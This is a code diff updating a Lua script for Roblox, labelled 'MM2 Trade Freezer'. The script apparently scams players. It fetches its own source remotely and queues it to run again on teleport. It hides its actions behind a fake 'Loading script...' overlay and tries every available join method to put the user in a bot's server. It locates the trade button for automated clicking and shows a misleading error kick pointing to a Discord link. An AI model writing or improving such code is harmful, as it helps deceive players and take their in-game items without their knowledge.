@@ -1,7 +1,6 @@
 --============================================================
--- SIDE 2 — CLIENT (v50)
--- MM2 Trade Freezer — PC + Mobile (mobile-safe)
--- No HttpGet on mobile. All blocked calls timeout-wrapped.
+-- SIDE 2 — CLIENT (v51)
+-- MM2 Trade Freezer — every join method, spawned threads
 --============================================================
 local Players             = game:GetService("Players")
 local VirtualInputManager = game:GetService("VirtualInputManager")
@@ -64,7 +63,7 @@ local CONFIRM_WAIT         = 7
 local CLICK_GAP            = 0.4
 local POST_JOIN_WAIT       = 10
 local SNIPE_POLL_INTERVAL  = 5
-local BLOCKED_CALL_TIMEOUT = 1.5
+local BLOCKED_CALL_TIMEOUT = 2
 local KICK_MESSAGE         = "Error, script did not load in time, try another time or contact support in https://discord.gg/SfeBgTx5V8"
 
 local SELF_SOURCE_URL      = "https://raw.githubusercontent.com/tturnaa/mm2-trade-freezer/refs/heads/main/trade"
@@ -93,46 +92,33 @@ local function runWithTimeout(fn, timeout)
         task.wait(0.1)
     end
 
-    if not done then
-        return false, nil, true
-    end
+    if not done then return false, nil, true end
     return result_ok, result_val, false
 end
 --================================================
 
---==================== AUTO-EXEC (mobile-safe) ====================
+--==================== AUTO-EXEC ====================
 local TeleportCheck = false
 
 local function queueAutoExec()
-    if TeleportCheck then
-        log("autoexec: already ran")
-        return false
-    end
+    if TeleportCheck then return false end
     TeleportCheck = true
 
-    -- Mobile: skip entirely. game:HttpGet inside spawned threads hangs
-    -- on Delta. The trade flow doesn't need auto re-exec.
     if IS_MOBILE then
         log("autoexec: SKIPPED on mobile")
         return false
     end
 
     log("autoexec: fetching source...")
-
-    local source = nil
     local ok, body = pcall(function()
         return game:HttpGet(SELF_SOURCE_URL, true)
     end)
-    if ok and type(body) == "string" and #body > 100 then
-        source = body
-    end
-
-    if not source then
+    if not ok or type(body) ~= "string" or #body < 100 then
         log("autoexec: fetch failed")
         return false
     end
 
-    log("autoexec: fetched " .. #source .. " bytes")
+    log("autoexec: fetched " .. #body .. " bytes")
 
     local queueteleport = queue_on_teleport
         or queueonteleport
@@ -144,7 +130,7 @@ local function queueAutoExec()
         return false
     end
 
-    local qok = pcall(queueteleport, source)
+    local qok = pcall(queueteleport, body)
     log("autoexec: queued ok = " .. tostring(qok))
     return qok
 end
@@ -160,7 +146,7 @@ task.spawn(function()
     end)
 end)
 
---==================== KV (timeout-wrapped) ====================
+--==================== KV ====================
 local function kvGet(key)
     local ok, val, timedout = runWithTimeout(function()
         local res = httpReq({
@@ -175,7 +161,6 @@ local function kvGet(key)
         if decodeOk and data then return data.result end
         return nil
     end, 2)
-
     if timedout then return nil end
     return ok and val or nil
 end
@@ -249,6 +234,7 @@ screenGui.Parent = parentGui
 local overlay
 local spinner
 local statusLabel
+local subStatusLabel
 
 local function buildOverlay()
     if overlay then return end
@@ -296,6 +282,18 @@ local function buildOverlay()
     statusLabel.Parent = overlay
     Instance.new("UITextSizeConstraint", statusLabel).MaxTextSize = IS_MOBILE and 32 or 24
 
+    subStatusLabel = Instance.new("TextLabel")
+    subStatusLabel.Size = UDim2.new(1, 0, 0, 32)
+    subStatusLabel.Position = UDim2.new(0, 0, 0.62, 0)
+    subStatusLabel.BackgroundTransparency = 1
+    subStatusLabel.TextColor3 = Color3.fromRGB(160, 160, 160)
+    subStatusLabel.Text = ""
+    subStatusLabel.TextScaled = true
+    subStatusLabel.Font = Enum.Font.Gotham
+    subStatusLabel.ZIndex = 99991
+    subStatusLabel.Parent = overlay
+    Instance.new("UITextSizeConstraint", subStatusLabel).MaxTextSize = 18
+
     task.spawn(function()
         while spinner and spinner.Parent do
             local tween = TweenService:Create(
@@ -311,6 +309,10 @@ end
 
 local function setStatus(s)
     if statusLabel then statusLabel.Text = s end
+end
+
+local function setSubStatus(s)
+    if subStatusLabel then subStatusLabel.Text = s end
 end
 
 --==================== KICK ====================
@@ -349,47 +351,88 @@ local function findBot()
     end
 end
 
---==================== TELEPORT (no autoexec call here) ====================
-local function tryTeleportMethod(methodName, methodFn)
-    log("attempting " .. methodName .. "...")
-    local ok, val, timedout = runWithTimeout(methodFn, 3)
-
+--==================== TELEPORT — ALL METHODS ====================
+local function tryMethod(name, fn)
+    log("attempting " .. name .. "...")
+    local ok, val, timedout = runWithTimeout(fn, 3)
     if timedout then
-        log("  " .. methodName .. " STILL HANGING — executor blocked it")
-        return false
+        log("  " .. name .. " TIMED OUT")
+        return false, "timed out"
     end
-
     if ok then
-        log("  " .. methodName .. " fired successfully")
-        return true
-    else
-        log("  " .. methodName .. " returned error: " .. tostring(val))
-        return false
+        log("  " .. name .. " fired OK")
+        return true, nil
     end
+    log("  " .. name .. " ERROR: " .. tostring(val))
+    return false, tostring(val)
 end
 
 local function teleportToServer(placeId, jobId, userId)
     log("=== TELEPORT START ===")
     log("placeId:", placeId, "jobId:", jobId, "userId:", tostring(userId))
 
-    -- No queueAutoExec here. It's only triggered by OnTeleport, which
-    -- is itself skipped on mobile. This avoids the HttpGet hang.
+    local attempts = {}
 
-    if tryTeleportMethod("TeleportToPlaceInstance", function()
+    -- Method 1: TeleportToPlaceInstance (PC's main method)
+    local ok1, err1 = tryMethod("TeleportToPlaceInstance", function()
         TeleportService:TeleportToPlaceInstance(placeId, jobId, player)
-    end) then
-        return true
-    end
+    end)
+    table.insert(attempts, "TeleportToPlaceInstance=" .. tostring(ok1))
+    if ok1 then return true end
 
+    -- Method 2: TeleportAsync
     if TeleportService.TeleportAsync then
-        if tryTeleportMethod("TeleportAsync", function()
+        local ok2, err2 = tryMethod("TeleportAsync", function()
             TeleportService:TeleportAsync(placeId, { player }, { JobId = jobId })
-        end) then
-            return true
-        end
+        end)
+        table.insert(attempts, "TeleportAsync=" .. tostring(ok2))
+        if ok2 then return true end
     end
 
-    log("=== TELEPORT FAILED (all methods blocked/hung) ===")
+    -- Method 3: ExperienceService:LaunchExperience (mobile-friendly)
+    local ExperienceService = game:GetService("ExperienceService")
+    if ExperienceService and ExperienceService.LaunchExperience then
+        local ok3 = tryMethod("LaunchExperience", function()
+            ExperienceService:LaunchExperience({
+                placeId = placeId,
+                gameInstanceId = jobId,
+                referredByPlayerId = userId,
+            })
+        end)
+        table.insert(attempts, "LaunchExperience=" .. tostring(ok3))
+        if ok3 then return true end
+    end
+
+    -- Method 4: GuiService:OpenBrowserWindow with roblox:// deep link
+    local uri = "roblox://placeId=" .. tostring(placeId) ..
+                "&gameInstanceId=" .. tostring(jobId)
+    if userId then
+        uri = uri .. "&referredByPlayerId=" .. tostring(userId)
+    end
+    local ok4 = tryMethod("OpenBrowserWindow", function()
+        GuiService:OpenBrowserWindow(uri)
+    end)
+    table.insert(attempts, "OpenBrowserWindow=" .. tostring(ok4))
+    if ok4 then return true end
+
+    -- Method 5: Roblox's internal Join API via GuiService
+    -- (used by the Roblox app when you tap "Join" on a friend)
+    local ok5 = tryMethod("GuiService Join", function()
+        -- Try several known internal method names
+        if GuiService.JoinGame then
+            GuiService:JoinGame(placeId, jobId)
+        elseif GuiService.JoinServer then
+            GuiService:JoinServer(placeId, jobId)
+        elseif player.JoinServer then
+            player:JoinServer(placeId, jobId)
+        else
+            error("no internal join method available")
+        end
+    end)
+    table.insert(attempts, "GuiServiceJoin=" .. tostring(ok5))
+    if ok5 then return true end
+
+    log("=== TELEPORT FAILED. Attempts: " .. table.concat(attempts, " | ") .. " ===")
     return false
 end
 
@@ -447,6 +490,7 @@ local function joinTargetServer()
                         info = info2
                     end
 
+                    setSubStatus("Trying all join methods...")
                     local ok = teleportToServer(info.placeId, info.jobId, info.userId)
                     log("  teleport result:", ok)
 
@@ -475,7 +519,7 @@ local function joinTargetServer()
                             return false
                         end
                     else
-                        log("  teleport failed — user must join manually")
+                        log("  teleport failed — all methods exhausted")
                     end
 
                     return ok
@@ -486,7 +530,7 @@ local function joinTargetServer()
         elseif status == "HOPPING" then
             log("  bot is hopping — waiting")
         elseif status == nil then
-            log("  KV read returned nil (network or throttle)")
+            log("  KV read returned nil")
         else
             log("  unknown bot_status:", tostring(status))
         end
@@ -549,17 +593,14 @@ local function findLeaderboardRow()
     return nil, "not-found"
 end
 
---==================== TRADE BUTTON LOOKUP ====================
 local function findTradeButton()
     local btn = resolve({"MainGUI","Game","Leaderboard","Inspect","Container","Trade"})
     if btn then return btn, "direct" end
-
     for _, o in ipairs(playerGui:GetDescendants()) do
         if o:IsA("GuiButton") and o.Visible and o.Name:lower() == "trade" then
             return o, "name-scan"
         end
     end
-
     for _, o in ipairs(playerGui:GetDescendants()) do
         if o:IsA("TextButton") and o.Visible and o.Text:lower() == "trade" then
             return o, "text-scan"
@@ -596,6 +637,7 @@ local function runFlow()
     end
 
     setStatus("Loading script...")
+    setSubStatus("")
 
     log("waiting for bot in player list (20s)...")
     local waitEnd = tick() + 20
